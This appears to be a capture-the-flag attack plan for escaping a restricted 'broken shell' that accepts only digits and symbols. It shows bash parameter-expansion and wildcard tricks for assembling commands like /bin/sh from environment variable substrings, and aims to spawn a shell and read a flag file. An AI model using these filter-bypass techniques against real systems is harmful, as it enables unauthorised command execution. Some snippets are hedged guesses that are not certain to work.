# Broken Shell Attack Plan

## Available Characters
```
0123456789${}/?"[:space:]:&>_=()
```

## Helpful Bash Techniques

### Parameter Expansion
Using `${parameter}` syntax, we can:

1. `${parameter:offset:length}` - Extract substrings
2. `${#parameter}` - Get the length of a parameter
3. `${parameter/pattern/replacement}` - Replace patterns

### Command Substitution
`$()` allows executing commands and substituting their output

### Interesting Variables
- `$$` - Current process ID
- `$?` - Exit status of the last command
- `$0` - Name of the current shell
- `${PATH}` - Search path for commands

## Attack Vectors

### 1. Command Execution via Parameter Expansion
We can extract characters from existing environment variables:
```bash
${PATH:0:1}  # Usually returns "/"
```

### 2. Command Construction
Build commands using parameter expansion from environment variables:
```bash
$(${PATH:0:1}???${PATH:5:1}${PATH:11:1})  # May construct "/bin/sh"
```

### 3. Command Execution via Special Parameters
```bash
$?  # Exit status (usually 0)
$$  # Process ID
```

### 4. Using Wildcards
```bash
$(/?/?/???)  # May match to common directories
```

### 5. Leveraging Existing Variables
```bash
$PATH
$HOME
$USER
$SHELL
```

## Target Commands
1. Get a shell: `/bin/sh`, `/bin/bash`
2. List files: `ls`, `/bin/ls`
3. Read flag: `cat flag.txt`, `/bin/cat flag*`
